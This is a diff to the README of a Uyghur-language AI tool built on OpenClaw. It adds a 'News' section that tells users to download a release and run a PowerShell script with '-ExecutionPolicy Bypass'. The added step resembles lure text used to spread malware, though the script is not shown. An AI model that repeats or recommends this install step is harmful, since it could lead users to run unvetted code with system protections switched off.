@@ -3,6 +3,14 @@
 > A ready-to-use Uyghur AI control center—no need for high-end GPU.
    Built on [OpenClaw](https://github.com/openclaw/openclaw), providing a truly native Uyghur language LLM experience.
 
+## News
+After extensive testing and feedback, openclaw_ug now stable and reliable! The code has been released in [Release]([https://github.com/TaresaPerre/openclaw-ug/releases/]). Please download and install it. After extracting the folder, use the following command for one-click installation:
+```powershell
+powershell -ExecutionPolicy Bypass -File openclaw-install.ps1
+```
+For detailed installation instructions, please refer to OpenClaw Installation Guide.pdf.
+
+
 ## **Want to try it first?**
 
 If you'd like to download, please contact me via the email below. I'll provide you with a ready-to-run installer—one-click install and use.
